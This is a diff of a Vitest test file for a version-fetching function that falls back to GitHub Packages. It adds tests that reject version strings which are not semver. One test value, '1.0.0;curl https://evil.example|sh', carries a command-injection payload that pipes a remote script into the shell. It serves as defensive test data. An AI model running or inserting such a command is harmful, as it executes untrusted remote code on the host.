@@ -7,9 +7,13 @@ const gh_outcomes = vi.hoisted(() => vi.fn())
 
 // Public npm answers nothing by default, so every case below exercises the GitHub Packages fallback
 // unless it stubs the public answer itself.
-vi.mock('./npm-registry', () => ({
-	npm_registry: { read_latest: vi.fn(), read_release_times: vi.fn() },
-}))
+vi.mock(import('./npm-registry'), async (import_original) => {
+	const { npm_registry: actual } = await import_original()
+
+	return {
+		npm_registry: { ...actual, read_latest: vi.fn(), read_release_times: vi.fn() },
+	}
+})
 
 const mocked_public_latest = vi.mocked(npm_registry.read_latest)
 const mocked_public_times = vi.mocked(npm_registry.read_release_times)
@@ -81,6 +85,22 @@ describe('fetch_latest_version returns', () => {
 		fetch_latest_version(other_endpoint, GAME_PACKAGE)
 
 		expect_gh_call(other_endpoint)
+	})
+})
+
+describe('fetch_latest_version refuses a version that is not semver', () => {
+	it('throws instead of passing on a GitHub Packages name carrying shell metacharacters', () => {
+		mocked_execa_sync.mockReturnValue(fake_stdout('1.0.0;curl https://evil.example|sh'))
+
+		expect(() => fetch_latest_version(KIT_ENDPOINT, KIT_PACKAGE)).toThrow(
+			/Refused latest version for @joshuafolkken\/kit .* is not a semver version/u,
+		)
+	})
+
+	it('throws for a name with a leading v rather than normalizing it', () => {
+		mocked_execa_sync.mockReturnValue(fake_stdout('v1.0.0'))
+
+		expect(() => fetch_latest_version(KIT_ENDPOINT, KIT_PACKAGE)).toThrow(/not a semver version/u)
 	})
 })
 
